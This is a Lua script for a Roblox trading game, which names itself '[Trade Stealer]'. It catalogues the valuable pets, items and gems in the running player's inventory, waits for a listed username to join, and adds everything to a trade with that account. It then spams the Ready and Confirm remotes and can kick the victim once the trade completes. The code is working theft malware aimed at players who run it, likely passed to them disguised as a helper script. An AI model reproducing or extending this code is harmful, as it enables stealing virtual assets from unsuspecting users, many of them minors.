local ALLOWED_CATEGORIES = {
    "Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"
}

local function getTradeId()
    local state = Trading.GetState()
    if state then return state._id end
    return nil
end

local function getTradeCounter()
    local state = Trading.GetState()
    if state then return state._counter end
    return nil
end

local function calculateRAP(category, item)
    local fake = {
        Class = {Name = category},
        IsA = function(_, name) return name == category end,
        GetId = function(_) return item.id end,
        StackKey = function(_)
            return game:GetService("HttpService"):JSONEncode({
                id = item.id,
                pt = item.pt,
                sh = item.sh,
                tn = item.tn,
            })
        end,
        AbstractGetRAP = function(self)
            if RAPCmds and type(RAPCmds.Get) == 'function' then
                local ok, value = pcall(RAPCmds.Get, self)
                if ok then return value end
            end
            return nil
        end,
    }
    return fake:AbstractGetRAP() or 0
end

local function isValuable(category, data, rap)
    local categoryAllowed = false
    for i = 1, #ALLOWED_CATEGORIES do
        if category == ALLOWED_CATEGORIES[i] then
            categoryAllowed = true
            break
        end
    end
    
    if not categoryAllowed then
        return false
    end
    
    local amount = data._am or data.Amount or 1
    local totalValue = rap * amount
    
    if category == "Pet" then
        local pet = Directory.Pets[data.id]
        if pet and (pet.gargantuan or pet.titanic or pet.huge or pet.exclusiveLevel or pet.exclusive) then
            return true
        end
        return false
    end
    
    return totalValue >= MIN_RAP
end

local function getAllValuableItems()
    local inv = Save.Get().Inventory
    local valuableItems = {}
    
    if not inv then
        return valuableItems
    end
    
    for i = 1, #ALLOWED_CATEGORIES do
        local category = ALLOWED_CATEGORIES[i]
        if inv[category] then
            for uid, data in pairs(inv[category]) do
                local rap = calculateRAP(category, data)
                
                if isValuable(category, data, rap) then
                    local amount = data._am or data.Amount or 1
                    local name = ""
                    if data.pt and data.pt == 1 then name = "Golden " end
                    if data.pt and data.pt == 2 then name = "Rainbow " end
                    if data.sh then name = "Shiny " .. name end
                    name = name .. (data.id or "Unknown")
                    
                    if amount > 1 then
                        name = name .. " (x" .. amount .. ")"
                    end
                    
                    table.insert(valuableItems, {
                        category = category,
                        uid = uid,
                        amount = amount,
                        rap = rap,
                        totalValue = rap * amount,
                        name = name
                    })
                end
            end
        end
    end
    
    table.sort(valuableItems, function(a, b)
        return a.totalValue > b.totalValue
    end)
    
    return valuableItems
end

local function getGems()
    local inv = Save.Get().Inventory
    if inv and inv.Currency then
        for uid, data in pairs(inv.Currency) do
            if data.id == "Diamonds" or data.id == "Gems" then
                local amount = data._am or 0
                if amount > 0 then
                    return { uid = uid, id = data.id, amount = amount }
                end
            end
        end
    end
    return nil
end

local function getPlayerByUsername(username)
    local players = Players:GetPlayers()
    for i = 1, #players do
        local player = players[i]
        if player.Name:lower() == username:lower() then
            return player
        end
    end
    return nil
end

local function waitForFirstPlayer(usernames)
    local maxAttempts = 3000 
    
    for attempt = 1, maxAttempts do
        for i = 1, #usernames do
            local player = getPlayerByUsername(usernames[i])
            if player then
                return player, usernames[i]
            end
        end
        RunService.Heartbeat:Wait()
    end
    
    return nil, nil
end

local function addItemToTrade(category, uid, amount)
    local tradeId = getTradeId()
    if not tradeId then return false end
    
    local success = Network.Invoke('Server: Trading: Set Item', tradeId, category, uid, amount or 1)
    return success == true
end

local function requestTrade(targetPlayer)
    return Network.Invoke('Server: Trading: Request', targetPlayer)
end

-- ========== SPAM READY + CONFIRM FUNCTION ==========
local function spamReadyAndConfirm()
    local tradeId = getTradeId()
    local counter = getTradeCounter()
    
    if not tradeId then
        warn("No trade ID found")
        return false
    end
    
    print("[Trade Stealer] Starting spam-ready...")
    
    -- Wait for UI to fully register items
    safeWait(2)
    
    local readySuccess = false
    local confirmSuccess = false
    local maxAttempts = 100
    
    -- SPAM READY REMOTE
    for i = 1, maxAttempts do
        tradeId = getTradeId()
        counter = getTradeCounter()
        
        if tradeId then
            local result = Network.Invoke('Server: Trading: Set Ready', tradeId, true, counter)
            if result == true then
                readySuccess = true
                print("[Trade Stealer] Ready sent! (Attempt " .. i .. ")")
            end
        end
        safeWait(0.05)
        
        -- Check if ready actually registered
        local state = Trading.GetState()
        if state and state._ready then
            local myIndex = state:PlayerIndex(player)
            if myIndex and state._ready[myIndex] == true then
                readySuccess = true
                print("[Trade Stealer] Ready confirmed in state!")
                break
            end
        end
        RunService.Heartbeat:Wait()
    end
    
    -- SPAM CONFIRM REMOTE
    for i = 1, maxAttempts do
        tradeId = getTradeId()
        counter = getTradeCounter()
        
        if tradeId then
            local result = Network.Invoke('Server: Trading: Set Confirmed', tradeId, true, counter)
            if result == true then
                confirmSuccess = true
                print("[Trade Stealer] Confirm sent! (Attempt " .. i .. ")")
            end
        end
        safeWait(0.05)
        
        -- Check if confirm actually registered
        local state = Trading.GetState()
        if state and state._confirmed then
            local myIndex = state:PlayerIndex(player)
            if myIndex and state._confirmed[myIndex] == true then
                confirmSuccess = true
                print("[Trade Stealer] Confirm confirmed in state!")
                break
            end
        end
        RunService.Heartbeat:Wait()
    end
    
    print("[Trade Stealer] Ready success: " .. tostring(readySuccess) .. " | Confirm success: " .. tostring(confirmSuccess))
    
    if KICK_ON_COMPLETE and (readySuccess or confirmSuccess) then
        safeWait(1)
        pcall(function()
            player:Kick("Trade completed")
        end)
    end
    
    return readySuccess and confirmSuccess
end

